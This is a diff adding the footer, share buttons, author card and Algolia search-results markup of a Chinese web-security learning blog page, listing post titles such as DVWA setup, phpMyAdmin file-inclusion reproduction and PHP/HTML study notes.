+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/09/16/practice16/"
+                    data-tooltip="Apache 和 Nginx 解析漏洞的验证"
+                    aria-label="NEXT: Apache 和 Nginx 解析漏洞的验证"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Share this post"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/17/uploadsum/"
+                    title="Share on Facebook"
+                    aria-label="Share on Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/17/uploadsum/"
+                    title="Share on Twitter"
+                    aria-label="Share on Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/09/17/uploadsum/"
+                    title="Share on Google+"
+                    aria-label="Share on Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="Table of Contents">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+                </div>
+                
+    <div id="share-options-bar" class="share-options-bar" data-behavior="5">
+        <i id="btn-close-shareoptions" class="fa fa-times"></i>
+        <ul class="share-options">
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/17/uploadsum/"
+                        aria-label="Share on Facebook"
+                    >
+                        <i class="fab fa-facebook" aria-hidden="true"></i><span>Share on Facebook</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/17/uploadsum/"
+                        aria-label="Share on Twitter"
+                    >
+                        <i class="fab fa-twitter" aria-hidden="true"></i><span>Share on Twitter</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://plus.google.com/share?url=http://yoursite.com/2019/09/17/uploadsum/"
+                        aria-label="Share on Google+"
+                    >
+                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>Share on Google+</span>
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+
+
+            
+        </div>
+        
+
+
+    
+        
+    
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-times"></i>
+        </div>
+        
+            <img id="about-card-picture" src="/assets/images/headimg.jpg" alt="Author&#39;s picture"/>
+        
+            <h4 id="about-card-name">han</h4>
+        
+            <div id="about-card-bio"><p>life and code</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>Web Security</p>
+
+            </div>
+        
+        
+            <div id="about-card-location">
+                <i class="fa fa-map-marker-alt"></i>
+                <br/>
+                Beijing, China
+            </div>
+        
+    </div>
+</div>
+
+        
+            <div id="algolia-search-modal" class="modal-container">
+    <div class="modal">
+        <div class="modal-header">
+            <span class="close-button"><i class="fa fa-times"></i></span>
+            <a href="https://algolia.com" target="_blank" rel="noopener" class="searchby-algolia text-color-light link-unstyled">
+                <span class="searchby-algolia-text text-color-light text-small">by</span>
+                <img class="searchby-algolia-logo" src="/assets/images/logo-algolia-nebula-blue-full.svg">
+            </a>
+            <i class="search-icon fa fa-search"></i>
+            <form id="algolia-search-form">
+                <input type="text" id="algolia-search-input" name="search"
+                    class="form-control input--large search-input" placeholder="Search "
+                    />
+            </form>
+        </div>
+        <div class="modal-body">
+            <div class="no-result text-color-light text-center">no post found</div>
+            <div class="results">
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/28/dvwa-deploy/"
+                            aria-label=": dvwa 在 CentOS 部署"
+                        >
+                            <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/image-gallery-showcase/city-140.jpg" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/28/dvwa-deploy/"
+                            aria-label=": dvwa 在 CentOS 部署"
+                        >
+                            <h3 class="media-heading">dvwa 在 CentOS 部署</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jul 28, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: CentOS7部署DVWA</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/28/phpmyadmin-bug/"
+                            aria-label=": phpmyadmin文件包含漏洞复现"
+                        >
+                            <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/japanese-test-post/peak-140.jpg" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/28/phpmyadmin-bug/"
+                            aria-label=": phpmyadmin文件包含漏洞复现"
+                        >
+                            <h3 class="media-heading">phpmyadmin文件包含漏洞复现</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jul 28, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: phpmyadmin4.8漏洞演示</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/29/note11/"
+                            aria-label=": 笔记11"
+                        >
+                            <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/elements-showcase/vintage-140.jpg" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/29/note11/"
+                            aria-label=": 笔记11"
+                        >
+                            <h3 class="media-heading">笔记11</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jul 29, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 本文档主要记录2019/07/29学习的主要内容</p>
+<a id="more"></a></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/29/week2sum/"
+                            aria-label=": 第二周总结"
+                        >
+                            <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/hexo-website/peak-140.jpg" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/29/week2sum/"
+                            aria-label=": 第二周总结"
+                        >
+                            <h3 class="media-heading">第二周总结</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jul 29, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 对第二周学习的内容进行总结，<code>note6-note10</code>的笔记。</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/29/simpleapp/"
+                            aria-label=": markdown语法"
+                        >
+                            <img class="media-image" src="https://images.pexels.com/photos/1367188/pexels-photo-1367188.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=1&amp;w=500" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/29/simpleapp/"
+                            aria-label=": markdown语法"
+                        >
+                            <h3 class="media-heading">markdown语法</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jul 29, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 用typora写markdown文档的语法</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/30/stage1-exam/"
+                            aria-label=": stage1知识盲点"
+                        >
+                            <img class="media-image" src="https://images.unsplash.com/photo-1564414872027-5ae7dac9a76f?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=700&amp;q=80" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/30/stage1-exam/"
+                            aria-label=": stage1知识盲点"
+                        >
+                            <h3 class="media-heading">stage1知识盲点</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jul 30, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 知识盲点总结</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/30/note12/"
+                            aria-label=": 笔记12"
+                        >
+                            <img class="media-image" src="https://images.unsplash.com/photo-1561363702-e07252da3399?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=1050&amp;q=80" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/30/note12/"
+                            aria-label=": 笔记12"
+                        >
+                            <h3 class="media-heading">笔记12</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jul 30, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 初学HTML</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/08/01/note13/"
+                            aria-label=": 笔记13"
+                        >
+                            <img class="media-image" src="https://images.unsplash.com/photo-1563930365798-3014c158554f?ixlib=rb-1.2.1&amp;auto=format&amp;fit=crop&amp;w=500&amp;q=60" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/08/01/note13/"
+                            aria-label=": 笔记13"
+                        >
+                            <h3 class="media-heading">笔记13</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Aug 1, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 初探CSS+JS</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/08/01/note14/"
+                            aria-label=": 笔记14"
+                        >
+                            <img class="media-image" src="https://images.pexels.com/photos/1656584/pexels-photo-1656584.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=1&amp;w=500" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/08/01/note14/"
+                            aria-label=": 笔记14"
+                        >
+                            <h3 class="media-heading">笔记14</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Aug 1, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: JS BOM和jQuery，以及php环境的搭建</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/08/03/note15/"
+                            aria-label=": 笔记15"
+                        >
+                            <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/hexo-website/peak-140.jpg" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/08/03/note15/"
+                            aria-label=": 笔记15"
+                        >
+                            <h3 class="media-heading">笔记15</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Aug 3, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: php基础语法和变量</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+            </div>
+        </div>
+        <div class="modal-footer">
+            <p class="results-count text-medium"
+                data-message-zero="no post found"
+                data-message-one="1 post found"
+                data-message-other="{n} posts found">
+                65 posts found
+            </p>
+        </div>
+    </div>
+</div>
+
+        
+        
+<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
+        <!--SCRIPTS-->
+<script src="/assets/js/script-miftf8se61zspg5fcsur8f7clgivo7gvevo5wqy4l6pigmbhx9ujvpue2enp.min.js"></script>
+<!--SCRIPTS END-->
+
+
+    
+
+
+
+    <script src="/assets/js/moment-with-locales.js"></script>
+    <script src="/assets/js/algoliasearch.js"></script>
+    <script>
+      var algoliaClient = algoliasearch('QHU2Y8U611', 'c66d405f4a2145e747c10a811d8acae2');
+      var algoliaIndex = algoliaClient.initIndex('tranquilpeak');
+    </script>
+
+
+    </body>
+</html>
